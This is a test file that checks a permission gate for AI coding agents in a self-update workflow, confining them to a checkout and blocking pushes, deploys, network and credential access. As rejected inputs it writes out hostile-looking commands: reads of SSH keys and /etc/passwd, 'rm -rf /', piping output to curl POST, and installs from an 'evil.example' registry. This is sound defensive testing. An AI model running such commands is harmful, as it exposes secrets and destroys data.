import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import type { PermissionRequest } from '../server/chat/adapters/types'
import type { PermissionOption } from '../server/chat/protocol'
import { changeAgentEnvironment, decideSelfChangePermission, type SelfChangeScope, type SelfChangeToolDecision } from '../server/self-update-tool-permissions'

// The automatic answer to native permission requests inside a Poise change
// turn. Each adapter's request shape is exercised as it is built in
// server/chat/adapters/*.ts; the scope is a fake canonical checkout with an
// identity realpath unless a test says otherwise.

const WS = '/Users/someone/.poise/self-update/work/change-1'
const scope: SelfChangeScope = { workspace: WS, branch: 'poise/change-1', realpath: (path) => path }

const CLAUDE_OPTIONS: PermissionOption[] = [
  { id: 'allow', name: 'Allow', kind: 'allow_once' },
  { id: 'allow_session', name: 'Allow for this session', kind: 'allow_always' },
  { id: 'reject', name: 'Reject', kind: 'reject_once' },
]
const CODEX_OPTIONS: PermissionOption[] = [
  { id: 'accept', name: 'Allow once', kind: 'allow_once' },
  { id: 'acceptForSession', name: 'Allow for this session', kind: 'allow_always' },
  { id: 'decline', name: 'Reject', kind: 'reject_once' },
  { id: 'cancel', name: 'Reject and stop', kind: 'reject_always' },
]
const MUSE_OPTIONS: PermissionOption[] = [
  { id: 'once', name: 'Allow once', kind: 'allow_once' },
  { id: 'session', name: 'Allow for session', kind: 'allow_always' },
  { id: 'deny', name: 'Deny', kind: 'reject_once' },
  { id: 'abort', name: 'Abort', kind: 'reject_always' },
]
const GROK_OPTIONS: PermissionOption[] = [
  { id: 'allow-once', name: 'Allow', kind: 'allow_once' },
  { id: 'allow-always', name: 'Always allow', kind: 'allow_always' },
  { id: 'reject-once', name: 'Reject', kind: 'reject_once' },
  { id: 'reject-always', name: 'Always reject', kind: 'reject_once' },
]

// Claude: the raw tool input, title from toolTitle().
function claude(tool: string, input: Record<string, unknown>): PermissionRequest {
  const title = tool === 'Bash' ? String(input.command) : `${tool} ${String(input.file_path ?? input.path ?? input.url ?? '')}`
  return { toolId: 'toolu_1', title, input, options: CLAUDE_OPTIONS }
}
function bash(command: string): PermissionRequest { return claude('Bash', { command, description: 'run' }) }

// Codex: item/commandExecution/requestApproval as the adapter wraps it.
function codexCommand(command: string | null, extra: Partial<{ cwd: string | null, kind: string, network: { host: string, protocol: string } | null }> = {}): PermissionRequest {
  return {
    toolId: 'item_1', title: command ?? 'Run a command',
    input: { command, cwd: extra.cwd ?? null, kind: extra.kind ?? 'command', actions: null, network: extra.network ?? null },
    options: CODEX_OPTIONS,
  }
}

// Muse: approval params as the adapter wraps them.
function muse(toolName: string, subject: Record<string, unknown>, args: unknown = undefined, protectedWrite = false): PermissionRequest {
  return { toolId: 'item_m', title: String(subject.command ?? subject.path ?? toolName), input: { tool: toolName, args, subject, protectedWrite }, options: MUSE_OPTIONS }
}

// Grok: rawInput only.
function grok(title: string, rawInput: unknown): PermissionRequest {
  return { toolId: 'call_1', title, input: rawInput, options: GROK_OPTIONS }
}

const decide = (request: PermissionRequest, custom: SelfChangeScope = scope) => decideSelfChangePermission(request, custom)

function expectAllow(decision: SelfChangeToolDecision, optionId: string) {
  expect(decision.verdict, decision.reason).toBe('allow')
  expect(decision.optionId).toBe(optionId)
}
function expectReject(decision: SelfChangeToolDecision, classification: SelfChangeToolDecision['classification'], optionId: string | null = 'reject') {
  expect(decision.verdict, decision.reason).toBe('reject')
  expect(decision.classification, decision.reason).toBe(classification)
  expect(decision.optionId).toBe(optionId)
  expect(decision.reason.length).toBeGreaterThan(20)
}

describe('file tools inside the prepared checkout', () => {
  it('allows Claude Read/Edit/Write of files anywhere in the checkout, front end and back end alike', () => {
    for (const request of [
      claude('Read', { file_path: `${WS}/src/views/chat-view.ts` }),
      claude('Edit', { file_path: `${WS}/server/chat/runtime.ts`, old_string: 'a', new_string: 'b' }),
      claude('Write', { file_path: `${WS}/tests/new.test.ts`, content: 'x' }),
      claude('Write', { file_path: `${WS}/package.json`, content: '{}' }),
      claude('MultiEdit', { file_path: `${WS}/docs/Chat-v1.md`, edits: [{ old_string: 'a', new_string: 'b' }] }),
      claude('NotebookEdit', { notebook_path: `${WS}/notes.ipynb`, new_source: 'x' }),
      claude('Glob', { pattern: '**/*.ts', path: `${WS}/src` }),
      claude('Grep', { pattern: 'requestPermission', path: WS }),
    ]) {
      const decision = decide(request)
      expectAllow(decision, 'allow')
      expect(decision.classification).toBe('workspace_file')
      expect(decision.evidence[0]).toMatch(/^(read|write) \//)
    }
  })

  it('records whether the access is a read or a write', () => {
    expect(decide(claude('Read', { file_path: `${WS}/README.md` })).evidence).toEqual([`read ${WS}/README.md`])
    expect(decide(claude('Write', { file_path: `${WS}/README.md`, content: '' })).evidence).toEqual([`write ${WS}/README.md`])
  })

  it('rejects paths outside the checkout, including traversal and the home directory', () => {
    expectReject(decide(claude('Edit', { file_path: '/Users/someone/dev/Poise/src/main.ts', old_string: 'a', new_string: 'b' })), 'outside_workspace')
    expectReject(decide(claude('Read', { file_path: `${WS}/../change-0/src/main.ts` })), 'outside_workspace')
    expectReject(decide(claude('Read', { file_path: `${WS}/src/../../../../etc/passwd` })), 'outside_workspace')
    expectReject(decide(claude('Read', { file_path: '~/.ssh/id_ed25519' })), 'outside_workspace')
    expectReject(decide(claude('Write', { file_path: '/tmp/notes.txt', content: '' })), 'outside_workspace')
    const decision = decide(claude('Read', { file_path: '/Users/someone/dev/Poise/README.md' }))
    expect(decision.reason).toContain('/Users/someone/dev/Poise/README.md')
    expect(decision.reason).toContain(WS)
  })

  it('rejects a path that is a prefix sibling of the checkout', () => {
    expectReject(decide(claude('Read', { file_path: `${WS}-other/src/main.ts` })), 'outside_workspace')
  })

  it('rejects dotenv files and writes into .git, and allows .env.example', () => {
    expectReject(decide(claude('Read', { file_path: `${WS}/.env` })), 'credentials')
    expectReject(decide(claude('Write', { file_path: `${WS}/.env.local`, content: 'KEY=1' })), 'credentials')
    expectReject(decide(claude('Write', { file_path: `${WS}/.git/config`, content: '' })), 'protected_path')
    expectReject(decide(claude('Write', { file_path: `${WS}/.git/hooks/pre-commit`, content: '' })), 'protected_path')
    expectAllow(decide(claude('Read', { file_path: `${WS}/.git/HEAD` })), 'allow')
    expectAllow(decide(claude('Read', { file_path: `${WS}/.env.example` })), 'allow')
  })

  it('checks nested path fields, not the title', () => {
    const request: PermissionRequest = {
      title: `Edit ${WS}/src/ok.ts`,
      input: { file_path: `${WS}/src/ok.ts`, edits: [{ old_string: 'a', new_string: 'b' }], extra: { files: [`${WS}/src/a.ts`, '/etc/hosts'] } },
      options: CLAUDE_OPTIONS,
    }
    const decision = decide(request)
    expectReject(decision, 'outside_workspace')
    expect(decision.reason).toContain('extra.files')
  })

  it('rejects requests with no path or command to check, naming the fields', () => {
    const decision = decide({ title: 'Agent: look around', input: { description: 'look around', prompt: 'x', subagent_type: 'Explore' }, options: CLAUDE_OPTIONS })
    expectReject(decision, 'unrecognised_request')
    expect(decision.reason).toContain('description, prompt, subagent_type')
    expectReject(decide({ title: 'TodoWrite', input: undefined, options: CLAUDE_OPTIONS }), 'unrecognised_request')
  })

  it('rejects network tools', () => {
    expectReject(decide(claude('WebFetch', { url: 'https://example.com', prompt: 'summarise' })), 'network')
  })
})

describe('symlinks', () => {
  let root: string
  let workspace: string
  beforeAll(() => {
    root = mkdtempSync(join(tmpdir(), 'poise-tool-permissions-'))
    mkdirSync(join(root, 'ws', 'src'), { recursive: true })
    mkdirSync(join(root, 'elsewhere'), { recursive: true })
    workspace = realpathSync(join(root, 'ws')) // /tmp is itself a symlink on macOS
    writeFileSync(join(root, 'elsewhere', 'secret.txt'), 'x')
    symlinkSync(join(root, 'elsewhere'), join(root, 'ws', 'escape'))
    symlinkSync(join(root, 'elsewhere', 'secret.txt'), join(root, 'ws', 'src', 'link.txt'))
  })
  afterAll(() => { rmSync(root, { recursive: true, force: true }) })

  it('follows symlinks with the real file system and rejects those that leave the checkout', () => {
    const real: SelfChangeScope = { workspace, branch: 'poise/change-2' }
    expectReject(decide(claude('Read', { file_path: `${workspace}/escape/secret.txt` }), real), 'outside_workspace')
    expectReject(decide(claude('Write', { file_path: `${workspace}/escape/new.txt`, content: '' }), real), 'outside_workspace')
    expectReject(decide(claude('Edit', { file_path: `${workspace}/src/link.txt`, old_string: 'x', new_string: 'y' }), real), 'outside_workspace')
    expect(decide(claude('Read', { file_path: `${workspace}/escape/secret.txt` }), real).reason).toContain('symlink')
    // A file that does not exist yet is checked through its existing parents.
    expectAllow(decide(claude('Write', { file_path: `${workspace}/src/new/deep/file.ts`, content: '' }), real), 'allow')
    expectReject(decide(claude('Write', { file_path: `${workspace}/escape/new/deep/file.ts`, content: '' }), real), 'outside_workspace')
    expectAllow(decide(bash(`cd ${workspace}/src && npm run check`), real), 'allow')
    expectReject(decide(bash(`cd ${workspace}/escape && npm run check`), real), 'outside_workspace')
  })
})

describe('local development commands (Claude Bash)', () => {
  it('allows the runbook commands and realistic chains', () => {
    for (const command of [
      'npm ci --include=dev',
      'npm ci',
      'npm install',
      'npm install --save-dev @types/foo',
      'npm run check',
      'npm test',
      'npm run test -- tests/self-update-tool-permissions.test.ts',
      'npm run lint && npm run typecheck',
      'npm run build 2>&1 | tail -50',
      'npx vitest run tests/chat/runtime.test.ts',
      'npx vitest run --reporter=dot',
      'npx playwright test tests/e2e/self-update.spec.ts --reporter=line',
      'npx eslint src server --fix',
      'npx tsc -p tsconfig.server.json --noEmit',
      './node_modules/.bin/vitest run',
      'node --version && npm --version',
      'node scripts/check-external-clis.mjs',
      'git status',
      'git status --porcelain',
      'git diff',
      'git diff --stat HEAD~1',
      'git log --oneline -20',
      'git show HEAD:src/main.ts',
      'git add src/views/chat-view.ts tests/chat-view.test.ts',
      'git add -A',
      'git add .',
      "git commit -m 'Add a search box above the session list'",
      'git commit -am "Filter sessions by title"',
      'git commit -m "Title" -m "Body line one; second line"',
      'git branch --show-current',
      'git rev-parse HEAD',
      'git ls-files src',
      'git config user.email poise@example.com',
      'ls -la src/views',
      'cat package.json | head -20',
      'grep -rn "requestPermission" server/chat',
      'rg --files-with-matches selfChangeId server',
      "sed -n '10,40p' server/chat/runtime.ts",
      'find src -name "*.ts" | wc -l',
      'mkdir -p src/views/new && touch src/views/new/index.ts',
      'rm -rf dist node_modules/.vite',
      'cd server && npm run check; cd .. && git status',
      `cd ${WS} && npm run check`,
      'CI=1 npm test',
      'npm run check # runs lint, tests and build',
      'timeout 600 npm run check',
      'npm run build > build.log 2>&1',
      'echo "done"',
    ]) {
      const decision = decide(bash(command))
      expect(decision.verdict, `${command}: ${decision.reason}`).toBe('allow')
      expect(decision.optionId).toBe('allow')
      expect(decision.classification).toBe('workspace_command')
      expect(decision.evidence[0]).toBe(`cwd ${WS}`)
    }
  })

  it('records every step of a chain as evidence', () => {
    const decision = decide(bash('cd server && npm run check; cd .. && git status'))
    expect(decision.evidence).toEqual([`cwd ${WS}`, 'run cd server', `cd ${WS}/server`, 'run npm run check', 'run cd ..', `cd ${WS}`, 'run git status'])
  })

  it('rejects push, merge, PR, branch and history operations as the controller\'s job', () => {
    for (const command of [
      'git push', 'git push origin poise/change-1', 'git push --force', 'git pull', 'git fetch origin',
      'git merge main', 'git rebase main', 'git reset --hard HEAD~1', 'git reset', 'git checkout main', 'git checkout -- src/main.ts',
      'git switch -c feature', 'git stash', 'git stash pop', 'git branch -D main', 'git branch new-branch', 'git tag v1', 'git cherry-pick abc123',
      'git commit --amend -m "x"', 'git remote set-url origin https://example.com/x.git', 'git clone https://github.com/x/y',
      'gh pr create --fill', 'gh pr merge 12',
    ]) {
      const decision = decide(bash(command))
      expect(decision.verdict, command).toBe('reject')
      expect(decision.classification, `${command}: ${decision.reason}`).toBe('release_control')
      expect(decision.optionId).toBe('reject')
      expect(decision.reason).toContain('release controller')
    }
  })

  it('names the bound branch when refusing a branch change', () => {
    expect(decide(bash('git checkout main')).reason).toContain('poise/change-1')
  })

  it('rejects restart, deploy and system operations', () => {
    expectReject(decide(bash('launchctl kickstart -k gui/501/com.vaquum.poise')), 'release_control')
    expectReject(decide(bash('pkill -f poise')), 'release_control')
    expectReject(decide(bash('kill -9 1234')), 'release_control')
    expectReject(decide(bash('npm run start:production')), 'interactive')
    expectReject(decide(bash('npm run install:production')), 'release_control')
    expectReject(decide(bash('npm run update:caller')), 'release_control')
    expectReject(decide(bash('sudo npm install')), 'credentials')
    expectReject(decide(bash('open http://localhost:5555')), 'interactive')
  })

  it('rejects network and credential operations', () => {
    expectReject(decide(bash('curl https://example.com')), 'network')
    expectReject(decide(bash('wget https://example.com/x.tgz')), 'network')
    expectReject(decide(bash('ssh host ls')), 'network')
    expectReject(decide(bash('npm install https://example.com/pkg.tgz')), 'network')
    expectReject(decide(bash('npm install ../other-package')), 'network')
    expectReject(decide(bash('npm install --registry=https://evil.example')), 'network')
    expectReject(decide(bash('npm install -g typescript')), 'network')
    expectReject(decide(bash('npx -y some-tool')), 'network')
    expectReject(decide(bash('npx cowsay hi')), 'network')
    expectReject(decide(bash('npx playwright install')), 'network')
    expectReject(decide(bash('npm publish')), 'credentials')
    expectReject(decide(bash('npm login')), 'credentials')
    expectReject(decide(bash('npm token create')), 'credentials')
    expectReject(decide(bash('security find-generic-password -s poise')), 'credentials')
    expectReject(decide(bash('cat .env')), 'credentials')
    expectReject(decide(bash('cat ~/.poise/self-update/release-token')), 'shell_construct')
    expectReject(decide(bash('cat /Users/someone/.poise/self-update/release-token')), 'outside_workspace')
    expectReject(decide(bash('git commit -S -m "signed"')), 'credentials')
    expectReject(decide(bash('git -c core.sshCommand=/tmp/x commit -m "x"')), 'credentials')
    expectReject(decide(bash('git config --global user.name x')), 'credentials')
    expectReject(decide(bash('git config core.hooksPath /tmp/hooks')), 'credentials')
  })

  it('rejects shell constructs it cannot read instead of guessing', () => {
    expectReject(decide(bash('npm test $(cat cmd)')), 'shell_construct')
    expectReject(decide(bash('cat `which node`')), 'shell_construct')
    expectReject(decide(bash('echo "$HOME"')), 'shell_construct')
    expectReject(decide(bash('cat ~/x')), 'shell_construct')
    expectReject(decide(bash('rm -rf src/{a,../../b}')), 'shell_construct')
    expectReject(decide(bash('npm test &')), 'shell_construct')
    expectReject(decide(bash('(cd /tmp && ls)')), 'shell_construct')
    expectReject(decide(bash('bash -c "curl x"')), 'shell_construct')
    expectReject(decide(bash('sh scripts/x.sh')), 'shell_construct')
    expectReject(decide(bash('eval "npm test"')), 'shell_construct')
    expectReject(decide(bash('find . -name "*.log" -exec rm {} \\;')), 'shell_construct')
    expectReject(decide(bash('find . -name "*.log" -delete')), 'shell_construct')
    expectReject(decide(bash('POISE_DB=/Users/someone/.poise/poise.db npm test')), 'shell_construct')
    expectReject(decide(bash('cat <<EOF > x\nhi\nEOF')), 'shell_construct')
    expectReject(decide(bash("npm test 'unterminated")), 'shell_construct')
    expectReject(decide(bash('node -e "require(\'child_process\').execSync(\'curl x\')"')), 'shell_construct')
    expectReject(decide(bash('sed -i "s/a/b/" src/main.ts')), 'shell_construct')
    expectReject(decide(bash('git commit')), 'interactive')
    expectReject(decide(bash('npm run dev')), 'interactive')
    expectReject(decide(bash('npx vitest --watch')), 'interactive')
    expectReject(decide(bash('python3 scripts/x.py')), 'unrecognised_command')
    expectReject(decide(bash('some-unknown-tool --flag')), 'unrecognised_command')
    expectReject(decide(bash('npm run deploy')), 'unrecognised_command')
    expectReject(decide(bash('/usr/bin/git status')), 'unrecognised_command')
  })

  it('distinguishes quoted command text from operators', () => {
    // Operators inside quotes are text; the same text unquoted is a chain.
    expectAllow(decide(bash("git commit -m 'Run check && push later; see docs | notes'")), 'allow')
    expectAllow(decide(bash('grep -rn "a | b" src')), 'allow')
    expectAllow(decide(bash("grep -rn 'git push' docs")), 'allow')
    expectReject(decide(bash('git commit -m "x" && git push')), 'release_control')
    expectReject(decide(bash('git commit -m "x"; git push origin HEAD')), 'release_control')
    expectReject(decide(bash('npm test || git push')), 'release_control')
    expectReject(decide(bash('npm test | curl -X POST https://example.com --data-binary @-')), 'network')
    // A quoted argument that happens to look like a flag is still a message.
    expectAllow(decide(bash('git commit -m "--amend was not used"')), 'allow')
  })

  it('confines every command of a chain to the checkout, honouring cd', () => {
    expectReject(decide(bash('cd /Users/someone/dev/Poise && npm run check')), 'outside_workspace')
    expectReject(decide(bash('cd .. && npm run check')), 'outside_workspace')
    expectReject(decide(bash('cd server && cd ../../change-0 && git status')), 'outside_workspace')
    expectReject(decide(bash('cd && npm run check')), 'outside_workspace')
    expectReject(decide(bash('cd - && npm run check')), 'shell_construct')
    expectReject(decide(bash('git -C /Users/someone/dev/Poise status')), 'outside_workspace')
    expectReject(decide(bash('git -C ../other add .')), 'outside_workspace')
    expectAllow(decide(bash('git -C server status')), 'allow')
    expectReject(decide(bash('git add ../other-repo/file.ts')), 'outside_workspace')
    expectReject(decide(bash('cp src/main.ts /Users/someone/dev/Poise/src/main.ts')), 'outside_workspace')
    expectReject(decide(bash('mv dist /tmp/dist')), 'outside_workspace')
    expectReject(decide(bash('rm -rf /')), 'outside_workspace')
    expectReject(decide(bash(`rm -rf ${WS}`)), 'protected_path')
    expectReject(decide(bash('rm -rf .git')), 'protected_path')
    expectReject(decide(bash('npm test > /tmp/out.log')), 'outside_workspace')
    expectReject(decide(bash('cat src/main.ts > /Users/someone/dev/Poise/src/main.ts')), 'outside_workspace')
    expectReject(decide(bash('echo x >> .git/config')), 'protected_path')
    expectReject(decide(bash('echo KEY=1 > .env')), 'credentials')
    expectReject(decide(bash('cat /etc/hosts')), 'outside_workspace')
    expectReject(decide(bash('ls /Users/someone/dev/Poise')), 'outside_workspace')
    expectReject(decide(bash('npx tsc -p ../other/tsconfig.json')), 'outside_workspace')
    expectReject(decide(bash('node /Users/someone/dev/Poise/scripts/x.mjs')), 'outside_workspace')
    expectReject(decide(bash('git add src/**/../../../etc')), 'outside_workspace')
    expectReject(decide(bash('ln -s /etc/passwd src/passwd')), 'protected_path')
  })

  it('keeps the shell command cwd inside the checkout when the request names one', () => {
    expectAllow(decide(grok('npm test', { command: 'npm test', cwd: `${WS}/server` })), 'allow-once')
    expectReject(decide(grok('npm test', { command: 'npm test', cwd: '/Users/someone/dev/Poise' })), 'outside_workspace', 'reject-once')
    expectReject(decide(grok('npm test', { command: 'npm test', cwd: '/tmp/unknown-checkout' })), 'outside_workspace', 'reject-once')
  })
})

describe('Codex requests', () => {
  it('answers command approvals with accept/decline, never the session-wide options', () => {
    expectAllow(decide(codexCommand('npm run check', { cwd: WS })), 'accept')
    expectReject(decide(codexCommand('git push origin HEAD', { cwd: WS })), 'release_control', 'decline')
    expectReject(decide(codexCommand('npm test', { cwd: '/Users/someone/dev/Poise' })), 'outside_workspace', 'decline')
    expectReject(decide(codexCommand('npm test', { cwd: '/tmp/somewhere-else' })), 'outside_workspace', 'decline')
    expectAllow(decide(codexCommand('npm test')), 'accept') // no cwd: the thread runs in the checkout
  })

  it('rejects stdin to a running command and commands it cannot read', () => {
    expectReject(decide(codexCommand(null, { kind: 'writeStdin' })), 'interactive', 'decline')
    expectReject(decide(codexCommand(null)), 'unrecognised_request', 'decline')
  })

  it('allows npm\'s registry fetch for installing dependencies and no other network grant', () => {
    expectAllow(decide(codexCommand('npm ci --include=dev', { cwd: WS, network: { host: 'registry.npmjs.org', protocol: 'https' } })), 'accept')
    expectReject(decide(codexCommand('npm ci', { cwd: WS, network: { host: 'evil.example', protocol: 'https' } })), 'network', 'decline')
    expectReject(decide(codexCommand('npm run check', { cwd: WS, network: { host: 'registry.npmjs.org', protocol: 'https' } })), 'network', 'decline')
    expectReject(decide(codexCommand('curl https://registry.npmjs.org/x', { cwd: WS, network: { host: 'registry.npmjs.org', protocol: 'https' } })), 'network', 'decline')
  })

  it('checks file-change grant roots and permission profiles against the checkout', () => {
    const fileChange = (grantRoot: string | null): PermissionRequest => ({ toolId: 'item_2', title: grantRoot ? `Write files under ${grantRoot}` : 'Apply file changes', input: { grantRoot }, options: CODEX_OPTIONS })
    expectAllow(decide(fileChange(`${WS}/src`)), 'accept')
    expectReject(decide(fileChange('/Users/someone/dev/Poise')), 'outside_workspace', 'decline')
    expectReject(decide(fileChange(null)), 'unrecognised_request', 'decline')

    const profile = (permissions: unknown, cwd = WS): PermissionRequest => ({ toolId: 'item_3', title: 'Grant additional permissions', input: { cwd, permissions }, options: CODEX_OPTIONS })
    expectAllow(decide(profile({ network: null, fileSystem: { read: [`${WS}/docs`], write: [`${WS}/dist`], entries: [{ path: { type: 'path', path: `${WS}/tests` }, access: 'write' }] } })), 'accept')
    expectReject(decide(profile({ network: { enabled: true }, fileSystem: null })), 'network', 'decline')
    expectReject(decide(profile({ network: null, fileSystem: { read: null, write: ['/Users/someone/.poise'] } })), 'outside_workspace', 'decline')
    expectReject(decide(profile({ network: null, fileSystem: { read: null, write: null, entries: [{ path: { type: 'special', value: 'home' }, access: 'write' }] } })), 'unrecognised_request', 'decline')
    expectReject(decide(profile({ network: null, fileSystem: { read: [`${WS}/docs`], write: null } }, '/Users/someone/dev/Poise')), 'outside_workspace', 'decline')
  })
})

describe('Muse requests', () => {
  it('checks shell subjects and file subjects like any other command or path', () => {
    expectAllow(decide(muse('shell', { kind: 'shell', command: 'npm run check', workspaceRoot: WS }, { command: 'npm run check' })), 'once')
    expectAllow(decide(muse('write_file', { kind: 'fileAccess', path: `${WS}/src/x.ts`, access: 'write' }, { path: `${WS}/src/x.ts`, content: '' })), 'once')
    expectAllow(decide(muse('read_file', { kind: 'fileAccess', path: `${WS}/.git/HEAD`, access: 'read' })), 'once')
    expectReject(decide(muse('shell', { kind: 'shell', command: 'git push' }, { command: 'git push' })), 'release_control', 'deny')
    expectReject(decide(muse('write_file', { kind: 'fileAccess', path: '/Users/someone/dev/Poise/src/x.ts', access: 'write' })), 'outside_workspace', 'deny')
    expectReject(decide(muse('shell', { kind: 'shell', command: 'npm test', workspaceRoot: '/Users/someone/dev/Poise' })), 'outside_workspace', 'deny')
  })

  it('rejects protected writes, network, sockets and process subjects', () => {
    expectReject(decide(muse('write_file', { kind: 'fileAccess', path: `${WS}/src/x.ts` }, undefined, true)), 'protected_path', 'deny')
    expectReject(decide(muse('fetch', { kind: 'network', host: 'example.com', port: 443 })), 'network', 'deny')
    expectReject(decide(muse('connect', { kind: 'unixSocket', target: '/var/run/docker.sock' })), 'unrecognised_command', 'deny')
    expectReject(decide(muse('signal', { kind: 'process', target: '1234' })), 'unrecognised_command', 'deny')
  })

  it('falls back to the tool arguments for other subject kinds', () => {
    expectAllow(decide(muse('patch', { kind: 'tool', toolName: 'patch' }, { path: `${WS}/src/x.ts`, patch: '...' })), 'once')
    expectReject(decide(muse('patch', { kind: 'tool', toolName: 'patch' }, { path: '/etc/hosts', patch: '...' })), 'outside_workspace', 'deny')
    expectReject(decide(muse('think', { kind: 'tool', toolName: 'think' }, { thought: 'hmm' })), 'unrecognised_request', 'deny')
  })
})

describe('Grok requests', () => {
  it('decides from rawInput, whatever the title says', () => {
    expectAllow(decide(grok('Read file', { path: `${WS}/src/main.ts` })), 'allow-once')
    expectAllow(decide(grok('Run command', { command: 'npx vitest run', description: 'tests' })), 'allow-once')
    expectReject(decide(grok('Read file', { path: '/Users/someone/dev/Poise/src/main.ts' })), 'outside_workspace', 'reject-once')
    expectReject(decide(grok('Run command', { command: 'git push' })), 'release_control', 'reject-once')
    expectReject(decide(grok('Read file inside the checkout', 'not an object')), 'unrecognised_request', 'reject-once')
    expectReject(decide(grok('Fetch', { url: 'https://example.com' })), 'network', 'reject-once')
  })
})

describe('option selection', () => {
  it('never picks a session-wide option, and reports when no once-only allow exists', () => {
    const request: PermissionRequest = { title: 'npm test', input: { command: 'npm test' }, options: [
      { id: 'always', name: 'Always', kind: 'allow_always' },
      { id: 'no', name: 'No', kind: 'reject_once' },
    ] }
    const decision = decide(request)
    expectReject(decision, 'no_once_option', 'no')
  })

  it('falls back to reject_always and then to no option when nothing else is offered', () => {
    const only: PermissionRequest = { title: 'git push', input: { command: 'git push' }, options: [{ id: 'stop', name: 'Stop', kind: 'reject_always' }] }
    expect(decide(only)).toMatchObject({ verdict: 'reject', optionId: 'stop', classification: 'release_control' })
    const none: PermissionRequest = { title: 'git push', input: { command: 'git push' }, options: [{ id: 'yes', name: 'Yes', kind: 'allow_once' }] }
    expect(decide(none)).toMatchObject({ verdict: 'reject', optionId: null, classification: 'release_control' })
  })
})

describe('changeAgentEnvironment', () => {
  it('drops the release identity, controller and runtime configuration, npm state and a production NODE_ENV', () => {
    const env = changeAgentEnvironment({
      PATH: '/opt/homebrew/opt/node@22/bin:/usr/bin',
      HOME: '/Users/someone',
      NODE_ENV: 'production',
      POISE_RELEASE_SHA: 'a'.repeat(40),
      POISE_RELEASE_ID: 'r-1',
      POISE_RELEASE_ROOT: '/Users/someone/.poise/self-update/releases/r-1',
      POISE_RELEASE_TOKEN_FILE: '/Users/someone/.poise/self-update/release-token',
      POISE_SELF_UPDATE_ROOT: '/Users/someone/.poise/self-update',
      POISE_BUILD: '1',
      POISE_ENV_ROOT: '/Users/someone/.poise/production',
      POISE_CHAT_ROOT: '/Users/someone/.poise/production/.poise-chat',
      POISE_DB: '/Users/someone/.poise/poise.db',
      POISE_PORT: '5555',
      POISE_ENFORCE_CALLER_RELEASE: '1',
      npm_config_production: 'true',
      npm_config_omit: 'dev',
      npm_lifecycle_event: 'start:production',
      INIT_CWD: '/Users/someone/.poise/production',
      CLAUDE_CLI: '/usr/local/bin/claude-subscription',
      ANTHROPIC_API_KEY: undefined,
      CI: '1',
    })
    expect(env).toEqual({
      PATH: '/opt/homebrew/opt/node@22/bin:/usr/bin',
      HOME: '/Users/someone',
      CLAUDE_CLI: '/usr/local/bin/claude-subscription',
      CI: '1',
    })
  })

  it('keeps a non-production NODE_ENV and does not add anything', () => {
    expect(changeAgentEnvironment({ NODE_ENV: 'test', TZ: 'UTC' })).toEqual({ NODE_ENV: 'test', TZ: 'UTC' })
    expect(changeAgentEnvironment({})).toEqual({})
  })

  it('does not mutate its input', () => {
    const base = { NODE_ENV: 'production', POISE_RELEASE_ID: 'r' }
    changeAgentEnvironment(base)
    expect(base).toEqual({ NODE_ENV: 'production', POISE_RELEASE_ID: 'r' })
  })
})
